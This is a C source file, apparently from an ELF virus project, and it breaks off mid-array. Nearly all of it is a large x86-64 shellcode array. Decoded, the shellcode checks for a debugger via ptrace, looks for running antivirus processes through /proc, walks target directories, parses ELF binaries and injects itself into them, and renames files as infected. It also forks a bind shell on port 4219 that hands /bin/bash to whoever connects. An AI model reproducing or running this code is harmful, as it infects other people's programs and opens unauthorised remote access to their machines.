# include <elf.h>
# include <sys/mman.h>
# include <sys/stat.h>
# include <sys/types.h>
# include <unistd.h>
# include <fcntl.h>
# include <ar.h>
# include <stdio.h>
# include <elf.h>
#include <fcntl.h>
#include <netdb.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>


#define SC_LEN 7131
//char s[SC_LEN] = "
//\x57\x56\x51\x53\x50\x52
//\xbf\x01\x00\x00\x00\x48\xb8\x48\x41\x43\x4b\x45\x44\x0a\x00\x50\x48\x89\xe6\xba\x07\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x58
//\x5a\x58\x5b\x59\x5e\x5f";
char s[SC_LEN] = "\x57\x56\x51\x53\x50\x52\xe8\x5a\x01\x00\x00\x50\x48\x31\xc0\x74\x01\x0f\x58\x48\xb8\x2f\x70\x72\x6f\x63\x00\x00\x00\x50\x48\x8d\x3c\x24\xe8\x9e\x02\x00\x00\x59\x50\x48\x31\xc0\x74\x01\x0f\x58\xe8\x6f\x04\x00\x00\xb8\x50\x00\x00\x00\x48\x31\xff\xbf\x74\x00\x00\x00\x57\x48\xbf\x2f\x74\x6d\x70\x2f\x74\x65\x73\x57\x48\x8d\x3c\x24\x0f\x05\x48\x83\xc4\x10\x48\x83\xf8\xff\x7e\x5c\x6a\x2e\x48\x8d\x3c\x24\x50\x48\x31\xc0\x74\x01\x0f\x58\xe8\xb6\x05\x00\x00\x48\x83\xc4\x08\xb8\x50\x00\x00\x00\x48\x31\xff\xbf\x74\x32\x00\x00\x57\x48\xbf\x2f\x74\x6d\x70\x2f\x74\x65\x73\x57\x48\x8d\x3c\x24\x0f\x05\x48\x83\xc4\x10\x48\x83\xf8\xff\x7e\x1c\x6a\x2e\x48\x8d\x3c\x24\x50\x48\x31\xc0\x74\x01\x0f\x58\xe8\x76\x05\x00\x00\x48\x83\xc4\x08\xe9\x1b\x1b\x00\x00\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\x48\xc1\xef\x08\x48\x81\xe7\xff\x00\x00\x00\x48\x89\xf8\xc3\xb8\x6e\x00\x00\x00\x0f\x05\x49\x89\xc7\xbf\x10\x00\x00\x00\x4c\x89\xfe\xba\x00\x00\x00\x00\x41\xba\x00\x00\x00\x00\xb8\x65\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x7c\x3b\x4c\x89\xff\xbe\x00\x00\x00\x00\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x41\xba\x00\x00\x00\x00\xb8\x3d\x00\x00\x00\x0f\x05\xbf\x11\x00\x00\x00\x4c\x89\xfe\xba\x00\x00\x00\x00\x41\xba\x00\x00\x00\x00\xb8\x65\x00\x00\x00\x0f\x05\xeb\x80\xb8\x47\x2e\x2e\x0a\x50\x48\xb8\x44\x45\x42\x55\x47\x47\x49\x4e\x50\x48\x8d\x3c\x24\xe8\x9f\x00\x00\x00\x48\x83\xc4\x10\xb8\x3c\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\xc3\x48\x83\xec\x01\x48\xbf\x2f\x62\x69\x6e\x2f\x62\x64\x00\x57\x48\x8d\x3c\x24\xbe\x41\x02\x00\x00\xba\xff\x09\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x49\x89\xc7\x5b\xb8\x02\x00\x00\x00\x48\xbf\x2f\x74\x6d\x70\x2f\x62\x64\x00\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05\x49\x89\xc6\x5b\x4c\x89\xf7\xb8\x00\x00\x00\x00\x48\x8d\x34\x24\xba\x01\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x7e\x14\x4c\x89\xff\xb8\x01\x00\x00\x00\x48\x89\xe6\xba\x01\x00\x00\x00\x0f\x05\xeb\xd3\xb8\x03\x00\x00\x00\x4c\x89\xff\x0f\x05\x4c\x89\xf7\xb8\x03\x00\x00\x00\x0f\x05\x48\x83\xc4\x01\xc3\x53\x51\x41\x50\x41\x51\x41\x52\x50\x56\x52\x57\xe8\x12\x04\x00\x00\x48\x89\xc2\xb8\x01\x00\x00\x00\x48\x89\xfe\xbf\x01\x00\x00\x00\x0f\x05\x5f\x5a\x5e\x58\x41\x5a\x41\x59\x41\x58\x59\x5b\xc3\x53\x51\x41\x50\x41\x51\x41\x52\x50\x56\x52\x57\xb8\x01\x00\x00\x00\x6a\x0a\x48\x8d\x34\x24\xba\x02\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x5f\x5a\x5e\x58\x41\x5a\x41\x59\x41\x58\x59\x5b\xc3\x53\x51\x41\x50\x41\x51\x41\x52\x50\x56\x52\x57\xb8\x01\x00\x00\x00\x68\x79\x0a\x00\x00\x48\x8d\x34\x24\xba\x02\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x5f\x5a\x5e\x58\x41\x5a\x41\x59\x41\x58\x59\x5b\xc3\x53\x51\x41\x50\x41\x51\x41\x52\x50\x56\x52\x57\xb8\x01\x00\x00\x00\x68\x6e\x0a\x00\x00\x48\x8d\x34\x24\xba\x02\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x5f\x5a\x5e\x58\x41\x5a\x41\x59\x41\x58\x59\x5b\xc3\x48\x81\xec\x00\x04\x00\x00\x48\x83\xec\x04\xbe\x00\x00\x01\x00\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x83\xf8\xff\x0f\x84\xd1\xfd\xff\xff\x48\x89\x04\x24\x48\x8b\x3c\x24\x48\x8d\x74\x24\x04\xba\x00\x04\x00\x00\xb8\xd9\x00\x00\x00\x0f\x05\x48\x83\xf8\xff\x0f\x84\xae\xfd\xff\xff\x48\x83\xf8\x00\x74\x42\x49\x89\xc2\x48\x31\xc9\x49\x89\xf0\x4c\x8d\x0c\x0e\x49\x8d\x71\x13\x41\x80\x79\x12\x04\x75\x13\x48\x89\xf7\xe8\x2e\x00\x00\x00\x48\x83\xf8\x00\x75\x05\xe8\x4a\x00\x00\x00\x4c\x89\xc6\x48\x31\xd2\x66\x41\x8b\x51\x10\x48\x01\xd1\x4c\x39\xd1\x73\x02\xeb\xc6\xeb\x99\x48\x83\xc4\x04\x48\x81\xc4\x00\x04\x00\x00\xc3\x51\x48\x31\xc9\xb8\x00\x00\x00\x00\x80\x3c\x0f\x00\x74\x16\x80\x3c\x0f\x30\x72\x0b\x80\x3c\x0f\x39\x77\x05\x48\xff\xc1\xeb\xe9\xb8\x01\x00\x00\x00\x59\xc3\x56\x51\x53\x52\x48\x83\xec\x40\xc6\x04\x24\x2f\xc6\x44\x24\x01\x70\xc6\x44\x24\x02\x72\xc6\x44\x24\x03\x6f\xc6\x44\x24\x04\x63\xc6\x44\x24\x05\x2f\xb9\x06\x00\x00\x00\x48\x31\xdb\x8a\x14\x1f\x80\xfa\x00\x74\x0b\x88\x14\x0c\x48\xff\xc3\x48\xff\xc1\xeb\xed\xc6\x04\x0c\x2f\x48\xff\xc1\xc6\x04\x0c\x63\x48\xff\xc1\xc6\x04\x0c\x6d\x48\xff\xc1\xc6\x04\x0c\x64\x48\xff\xc1\xc6\x04\x0c\x6c\x48\xff\xc1\xc6\x04\x0c\x69\x48\xff\xc1\xc6\x04\x0c\x6e\x48\xff\xc1\xc6\x04\x0c\x65\x48\xff\xc1\xc6\x04\x0c\x00\x48\x8d\x3c\x24\xe8\x13\x00\x00\x00\x48\x83\xf8\x00\x0f\x85\xa4\xfc\xff\xff\x48\x83\xc4\x40\x5a\x5b\x59\x5e\xc3\x53\x51\x41\x50\x41\x51\x41\x52\x56\x52\x57\xe8\xf1\x03\x00\x00\x48\x89\xc7\x48\x83\xec\x01\x48\x31\xc9\xb9\x73\x00\x00\x00\x51\x48\xb9\x61\x6e\x74\x69\x76\x69\x72\x75\x51\x48\x31\xc9\x48\x8d\x74\x24\x10\xba\x01\x00\x00\x00\xb8\x00\x00\x00\x00\x51\x0f\x05\x59\x48\x83\xf8\x00\x74\x25\x8a\x14\x0c\x38\x54\x24\x10\x75\x0b\x48\xff\xc1\x48\x83\xf9\x09\x74\x0e\xeb\xd3\x48\x31\xc9\xeb\xce\xb8\x00\x00\x00\x00\xeb\x05\xb8\x01\x00\x00\x00\x48\x83\xc4\x11\x50\xb8\x03\x00\x00\x00\x0f\x05\x58\x5f\x5a\x5e\x41\x5a\x41\x59\x41\x58\x59\x5b\xc3\xb8\x39\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x75\x0a\xe8\x06\x00\x00\x00\xe9\xff\xfb\xff\xff\xc3\x48\x83\xec\x10\x48\x83\xec\x10\x48\x83\xec\x0c\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\x48\x31\xd2\x0f\x05\x48\x83\xf8\xff\x0f\x84\xd4\xfb\xff\xff\x89\x04\x24\x66\xc7\x44\x24\x1c\x02\x00\x66\xc7\x44\x24\x1e\x10\x7b\xc7\x44\x24\x20\x7f\x00\x00\x01\xb8\x31\x00\x00\x00\x48\x31\xff\x8b\x3c\x24\x48\x8d\x74\x24\x1c\xba\x10\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x0f\x85\x9a\xfb\xff\xff\xb8\x32\x00\x00\x00\xbe\x02\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x0f\x85\x84\xfb\xff\xff\xc7\x44\x24\x08\x10\x00\x00\x00\xb8\x2b\x00\x00\x00\x48\x8d\x74\x24\x0c\x48\x8d\x54\x24\x08\x0f\x05\x48\x83\xf8\xff\x0f\x84\x61\xfb\xff\xff\x89\x44\x24\x04\x48\x31\xff\x8b\x7c\x24\x04\xe8\x09\x00\x00\x00\x48\x83\xc4\x0c\x48\x83\xc4\x20\xc3\xb8\x00\x00\x00\x00\xb8\x68\x00\x00\x00\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\x48\x83\xec\x10\x48\x8d\x5c\x24\x10\x48\x89\x1c\x24\x48\x31\xdb\x48\x89\x5c\x24\x08\x48\x83\xec\x08\x48\x89\x1c\x24\x57\xb8\x03\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xb8\x03\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\xb8\x03\x00\x00\x00\xbf\x02\x00\x00\x00\x0f\x05\x5f\xb8\x21\x00\x00\x00\xbe\x00\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe\x02\x00\x00\x00\x0f\x05\xb8\x3b\x00\x00\x00\x48\x8d\x7c\x24\x18\x48\x8d\x74\x24\x08\x48\x8d\x14\x24\x0f\x05\xe9\xb1\xfa\xff\xff\x48\x83\xc4\x08\x48\x83\xc4\x10\x48\x83\xc4\x10\xc3\xb8\x00\x00\x00\x00\x80\x3c\x07\x00\x74\x05\x48\xff\xc0\xeb\xf5\xc3\x48\x81\xec\x00\x04\x00\x00\x48\x83\xec\x04\xbe\x00\x00\x01\x00\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x83\xf8\xff\x0f\x84\x6f\xfa\xff\xff\x48\x89\x04\x24\x48\x8b\x3c\x24\x48\x8d\x74\x24\x04\xba\x00\x04\x00\x00\xb8\xd9\x00\x00\x00\x0f\x05\x48\x83\xf8\xff\x0f\x84\x4c\xfa\xff\xff\x48\x83\xf8\x00\x74\x37\x49\x89\xc2\x48\x31\xc9\x49\x89\xf0\x4c\x8d\x0c\x0e\x49\x8d\x71\x13\x41\x80\x79\x12\x08\x75\x08\x48\x89\xf7\xe8\x23\x00\x00\x00\x4c\x89\xc6\x48\x31\xd2\x66\x41\x8b\x51\x10\x48\x01\xd1\x4c\x39\xd1\x73\x02\xeb\xd1\xeb\xa4\x48\x83\xc4\x04\x48\x81\xc4\x00\x04\x00\x00\xc3\x53\x51\x41\x50\x41\x51\x41\x52\x50\x56\x52\x57\x48\x83\xec\x08\x48\x83\xec\x08\x48\x83\xec\x08\x48\x83\xec\x04\x48\x89\x7c\x24\x14\xe8\x43\x01\x00\x00\x48\x83\xf8\xff\x0f\x84\x11\x01\x00\x00\x48\x89\x04\x24\xe8\x4e\x01\x00\x00\x48\x83\xf8\x00\x0f\x85\xfe\x00\x00\x00\x48\x8b\x3c\x24\x48\x8d\x74\x24\x0c\xe8\xb2\x01\x00\x00\x48\x89\x44\x24\x04\x48\x83\x7c\x24\x0c\x34\x0f\x82\xdf\x00\x00\x00\xb8\x00\x00\x00\x00\x48\x8b\x44\x24\x04\x80\x38\x7f\x0f\x85\xcc\x00\x00\x00\x80\x78\x01\x45\x0f\x85\xc2\x00\x00\x00\x80\x78\x02\x4c\x0f\x85\xb8\x00\x00\x00\x80\x78\x03\x46\x0f\x85\xae\x00\x00\x00\x66\x83\x78\x10\x02\x74\x07\x66\x83\x78\x10\x03\x75\x76\x80\x78\x04\x02\x75\x37\x48\x8b\x7c\x24\x14\xe8\x46\x02\x00\x00\x48\x83\xf8\xff\x0f\x84\x86\x00\x00\x00\x48\x8b\x7c\x24\x04\x48\x89\xc6\x48\x8b\x54\x24\x0c\x4c\x8b\x7c\x24\x14\xe8\xb1\x02\x00\x00\x48\x8b\x7c\x24\x14\xe8\x9d\x01\x00\x00\xeb\x63\x80\x78\x04\x01\x75\x5d\x48\x8b\x7c\x24\x14\xe8\x09\x02\x00\x00\x48\x83\xf8\xff\x74\x4d\x48\x8b\x7c\x24\x04\x48\x89\xc6\x48\x8b\x54\x24\x0c\x4c\x8b\x7c\x24\x14\xe8\xac\x0c\x00\x00\x48\x8b\x7c\x24\x14\xe8\x64\x01\x00\x00\xeb\x2a\x66\x83\x78\x10\x01\x75\x23\x48\x8b\x7c\x24\x14\x4c\x8b\x7c\x24\x14\xe8\x4a\x00\x00\x00\x48\x89\xc7\xe8\x60\x0b\x00\x00\xe8\xa6\x0b\x00\x00\xb8\x03\x00\x00\x00\x0f\x05\xb8\x03\x00\x00\x00\x48\x8b\x3c\x24\x0f\x05\x48\x83\xc4\x04\x48\x83\xc4\x08\x48\x83\xc4\x08\x48\x83\xc4\x08\x5f\x5a\x5e\x58\x41\x5a\x41\x59\x41\x58\x59\x5b\xc3\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\xc3\xbe\x42\x04\x00\x00\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\xc3\x53\x51\x41\x50\x41\x51\x41\x52\x56\x52\x57\xe8\xd2\xff\xff\xff\x48\x89\xc7\x48\x83\xec\x01\x48\xb9\x73\x65\x6c\x2d\x6d\x65\x6c\x63\x51\x48\x31\xc9\x48\x8d\x74\x24\x08\xba\x01\x00\x00\x00\xb8\x00\x00\x00\x00\x51\x0f\x05\x59\x48\x83\xf8\x00\x74\x25\x8a\x14\x0c\x38\x54\x24\x08\x75\x0b\x48\xff\xc1\x48\x83\xf9\x08\x74\x0e\xeb\xd3\x48\x31\xc9\xeb\xce\xb8\x00\x00\x00\x00\xeb\x05\xb8\x01\x00\x00\x00\x48\x83\xc4\x09\x50\xb8\x03\x00\x00\x00\x0f\x05\x58\x5f\x5a\x5e\x41\x5a\x41\x59\x41\x58\x59\x5b\xc3\x48\x83\xec\x08\x56\xb8\x08\x00\x00\x00\xbe\x00\x00\x00\x00\xba\x01\x00\x00\x00\x0f\x05\x48\x89\x44\x24\x08\xb8\x08\x00\x00\x00\xbe\x00\x00\x00\x00\xba\x02\x00\x00\x00\x0f\x05\x5e\x48\x89\x06\x56\x48\x8b\x74\x24\x08\xba\x00\x00\x00\x00\xb8\x08\x00\x00\x00\x0f\x05\x5e\xb8\x09\x00\x00\x00\x49\x89\xf8\xbf\x00\x00\x00\x00\xba\x01\x00\x00\x00\x41\xba\x02\x00\x00\x00\x41\xb9\x00\x00\x00\x00\x48\x8b\x36\x0f\x05\x48\x83\xf8\xff\x75\x05\xb8\x00\x00\x00\x00\x48\x83\xc4\x08\xc3\xe8\xe1\xfc\xff\xff\x48\x83\xc0\x0a\x48\x29\xc4\x50\x48\x8d\x74\x24\x08\x48\x31\xc9\x80\x3c\x0f\x00\x74\x0b\x8a\x14\x0f\x88\x14\x0e\x48\xff\xc1\xeb\xef\xc6\x04\x0e\x5f\x48\xff\xc1\xc6\x04\x0e\x69\x48\xff\xc1\xc6\x04\x0e\x6e\x48\xff\xc1\xc6\x04\x0e\x66\x48\xff\xc1\xc6\x04\x0e\x65\x48\xff\xc1\xc6\x04\x0e\x63\x48\xff\xc1\xc6\x04\x0e\x74\x48\xff\xc1\xc6\x04\x0e\x65\x48\xff\xc1\xc6\x04\x0e\x64\x48\xff\xc1\xc6\x04\x0e\x00\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\xb8\x52\x00\x00\x00\x0f\x05\x58\x48\x01\xc4\xc3\x51\x52\xe8\x61\xfc\xff\xff\x48\x83\xc0\x0a\x48\x29\xc4\x50\x48\x8d\x74\x24\x08\x48\x31\xc9\x80\x3c\x0f\x00\x74\x0b\x8a\x14\x0f\x88\x14\x0e\x48\xff\xc1\xeb\xef\xc6\x04\x0e\x5f\x48\xff\xc1\xc6\x04\x0e\x69\x48\xff\xc1\xc6\x04\x0e\x6e\x48\xff\xc1\xc6\x04\x0e\x66\x48\xff\xc1\xc6\x04\x0e\x65\x48\xff\xc1\xc6\x04\x0e\x63\x48\xff\xc1\xc6\x04\x0e\x74\x48\xff\xc1\xc6\x04\x0e\x65\x48\xff\xc1\xc6\x04\x0e\x64\x48\xff\xc1\xc6\x04\x0e\x00\xb8\x02\x00\x00\x00\x48\x89\xf7\xbe\x42\x02\x00\x00\xba\xff\x01\x00\x00\x0f\x05\x48\x89\xc3\x58\x48\x01\xc4\x48\x89\xd8\x5a\x59\xc3\x48\x83\xec\x08\xe8\x5f\x02\x00\x00\x48\x89\x04\x24\x48\x83\xf8\x00\x74\x07\xe8\xaf\x02\x00\x00\xeb\x05\xe8\x0a\x03\x00\x00\x49\x89\xc2\xe8\x24\x00\x00\x00\x48\x83\x3c\x24\x00\x74\x07\xe8\x58\x03\x00\x00\xeb\x05\xe8\xa0\x04\x00\x00\x49\x89\xc2\x48\x8b\x04\x24\xe8\xe3\x05\x00\x00\x48\x83\xc4\x08\xc3\x57\x56\x52\x48\x83\xec\x08\x48\x83\xf8\x00\x74\x07\xe8\x83\x00\x00\x00\xeb\x05\xe8\xde\x00\x00\x00\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\xba\x18\x00\x00\x00\x50\xb8\x01\x00\x00\x00\x0f\x05\x58\x48\x89\x04\x24\x48\x83\xc6\x20\x48\x89\xf3\x48\x89\xe6\xba\x08\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xba\x08\x00\x00\x00\x48\x89\xde\xb8\x01\x00\x00\x00\x0f\x05\x4c\x89\x14\x24\x48\x81\x04\x24\x88\x1c\x00\x00\x48\x8b\x5e\x08\x48\x01\x1c\x24\x48\x89\xf3\x48\x89\xe6\xb8\x01\x00\x00\x00\x0f\x05\x48\x89\xde\x48\x83\xc6\x10\xba\x10\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x04\x06\x75\x08\x49\x8b\x41\x28\x49\x03\x41\x10\x48\xff\xc1\x48\x83\xc2\x38\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x04\x05\x75\x08\x49\x8b\x41\x28\x49\x03\x41\x10\x48\xff\xc1\x48\x83\xc2\x38\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x04\x06\x75\x08\x49\x8b\x41\x20\x49\x03\x41\x08\x48\xff\xc1\x48\x83\xc2\x38\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x04\x05\x75\x08\x49\x8b\x41\x20\x49\x03\x41\x08\x48\xff\xc1\x48\x83\xc2\x38\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x1f\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0c\x41\x83\x79\x04\x06\x75\x05\xb8\x01\x00\x00\x00\x48\xff\xc1\x48\x83\xc2\x38\xeb\xdb\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x04\x06\x75\x08\x49\x8b\x41\x28\x49\x2b\x41\x20\x48\xff\xc1\x48\x83\xc2\x38\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x51\x53\x41\x51\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x7d\x22\x4c\x8d\x0c\x16\x41\x83\x39\x01\x75\x0f\x41\x83\x79\x04\x05\x75\x08\x49\x8b\x41\x28\x49\x2b\x41\x20\x48\xff\xc1\x48\x83\xc2\x38\xeb\xd8\x48\x83\xc4\x02\x41\x59\x5b\x59\x5a\x5e\x5f\xc3\x57\x56\x52\x48\x83\xec\x08\x48\x83\xec\x04\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x0f\x8d\x03\x01\x00\x00\x4c\x8d\x0c\x16\x41\x83\x39\x01\x0f\x85\xd2\x00\x00\x00\x50\x51\x56\x52\x4c\x89\xce\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xc7\x44\x24\x02\x07\x00\x00\x00\x50\x51\x56\x52\x48\x8d\x74\x24\x22\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x41\x83\x79\x04\x06\x74\x1d\x50\x51\x56\x52\x49\x8d\x71\x08\xba\x30\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xe9\x8d\x00\x00\x00\x50\x51\x56\x52\x49\x8d\x71\x08\xba\x18\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x49\x8b\x41\x28\x48\x89\x44\x24\x06\x48\x81\x44\x24\x06\x88\x1c\x00\x00\x50\x51\x56\x52\x48\x8d\x74\x24\x26\xba\x08\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\xba\x08\x00\x00\x00\x49\x8d\x71\x30\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x48\x81\x6c\x24\x06\x88\x1c\x00\x00\x48\x8b\x44\x24\x06\x49\x2b\x41\x20\xeb\x17\x50\x51\x56\x52\x4c\x89\xce\xba\x38\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x48\xff\xc1\x48\x83\xc2\x38\xe9\xf3\xfe\xff\xff\x48\x83\xc4\x02\x48\x83\xc4\x04\x48\x83\xc4\x08\x5a\x5e\x5f\xc3\x57\x56\x52\x48\x83\xec\x08\x48\x83\xec\x04\x48\x83\xec\x02\xb8\x00\x00\x00\x00\x66\x8b\x5f\x38\x66\x89\x1c\x24\x48\x8b\x5f\x20\x48\x01\xdf\x48\x89\xfb\x48\x89\xf7\x48\x89\xde\x48\x31\xc9\x48\x31\xd2\x66\x3b\x0c\x24\x0f\x8d\x03\x01\x00\x00\x4c\x8d\x0c\x16\x41\x83\x39\x01\x0f\x85\xd2\x00\x00\x00\x50\x51\x56\x52\x4c\x89\xce\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xc7\x44\x24\x02\x07\x00\x00\x00\x50\x51\x56\x52\x48\x8d\x74\x24\x22\xba\x04\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x41\x83\x79\x04\x05\x74\x1d\x50\x51\x56\x52\x49\x8d\x71\x08\xba\x30\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\xe9\x8d\x00\x00\x00\x50\x51\x56\x52\x49\x8d\x71\x08\xba\x18\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x49\x8b\x41\x28\x48\x89\x44\x24\x06\x48\x81\x44\x24\x06\x88\x1c\x00\x00\x50\x51\x56\x52\x48\x8d\x74\x24\x26\xba\x08\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x50\x51\x56\x52\xba\x08\x00\x00\x00\x49\x8d\x71\x30\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x48\x81\x6c\x24\x06\x88\x1c\x00\x00\x48\x8b\x44\x24\x06\x49\x2b\x41\x20\xeb\x17\x50\x51\x56\x52\x4c\x89\xce\xba\x38\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x5e\x59\x58\x48\xff\xc1\x48\x83\xc2\x38\xe9\xf3\xfe\xff\xff\x48\x83\xc4\x02\x48\x83\xc4\x04\x48\x83\xc4\x08\x5a\x5e\x5f\xc3\x49\x89\xc4\x48\x83\xec\x08\x48\x83\xec\x08\x48\x83\xec\x08\x49\x89\xd1\x48\x89\x7c\x24\x10\x48\x83\xf8\x00\x74\x07\xe8\x59\xfb\xff\xff\xeb\x05\xe8\xb4\xfb\xff\xff\x48\x89\x44\x24\x08\x48\x89\xf3\x48\x89\xfe\x48\x89\xdf\x48\x31\xdb\x66\x8b\x5e\x38\xb8\x38\x00\x00\x00\x48\xf7\xe3\x48\x03\x46\x20\x48\x89\x04\x24\x48\x8d\x34\x06\x48\x8b\x54\x24\x08\x48\x2b\x14\x24\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xc9\x4c\x39\xd1\x73\x1c\x56\x51\x6a\x00\x48\x8d\x34\x24\xba\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x5a\x59\x5e\x48\xff\xc1\xeb\xdf\xe8\x3f\x00\x00\x00\x48\x8b\x74\x24\x10\xe8\xb3\x01\x00\x00\xe8\x0d\x02\x00\x00\xe8\x4a\x02\x00\x00\xe8\x90\x02\x00\x00\x48\x8b\x74\x24\x10\x48\x03\x74\x24\x08\x4c\x89\xca\x48\x2b\x54\x24\x08\xb8\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x48\x83\xc4\x08\x48\x83\xc4\x08\xc3\x57\x48\x81\xec\xdb\x1b\x00\x00\x57\xb8\x02\x00\x00\x00\x48\xbf\x2f\x74\x6d\x70\x2f\x73\x63\x00\x57\x48\